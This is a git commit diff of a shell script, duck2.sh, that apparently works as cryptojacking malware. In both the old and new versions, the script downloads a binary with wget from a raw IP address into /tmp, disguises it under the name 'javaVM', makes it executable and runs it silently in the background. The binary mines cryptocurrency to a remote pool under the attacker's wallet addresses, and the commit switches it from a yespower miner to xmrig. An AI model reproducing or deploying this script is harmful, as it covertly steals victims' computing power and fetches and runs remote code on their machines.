02d36bdc6a448cd35918fb1a95b9019a94fab1e8
cronjob <thesunofme1@gmail.com>
2023-11-17 12:54:30 +0700

    Update duck2.sh

--- duck2.sh
+++ duck2.sh
@@ -1,10 +1,10 @@
 #!/bin/sh
 if [ -f /tmp/javaVM ]
-   then
-   /tmp/javaVM -a yespowersugar -o 143.47.231.0:443 -u RLaigv5nSC2dKvM63F8dN4EHjxBEcZi11o -p c=RVN -t 1 > /dev/null 2>&1 &
-   echo Started Existing
-   else
-     wget -q http://150.136.168.71:80/archxx/yespowersugar -O /tmp/javaVM
-     chmod +x /tmp/javaVM
-     /tmp/javaVM -a yespowersugar -o 143.47.231.0:443 -u RLaigv5nSC2dKvM63F8dN4EHjxBEcZi11o -p c=RVN -t 1 > /dev/null 2>&1 &
+ 	then
+ 	/tmp/javaVM -o 143.47.231.0:443 -u ZEPHYR3RCLzj46G67Ubxse1CHxYyH8BmWhq5zYR6jpsBWrZpPq9N5dGa9gAJHNC1KfC5NkRjAecx954DRsUu7spVja4UDc9NuEa2e -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
+ 	echo Started Existing
+ 	else
+ 		wget -q http://150.136.168.71:80/archxx/xmrig -O /tmp/javaVM
+ 		chmod +x /tmp/javaVM
+ 		/tmp/javaVM -o 143.47.231.0:443 -u ZEPHYR3RCLzj46G67Ubxse1CHxYyH8BmWhq5zYR6jpsBWrZpPq9N5dGa9gAJHNC1KfC5NkRjAecx954DRsUu7spVja4UDc9NuEa2e -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
 fi
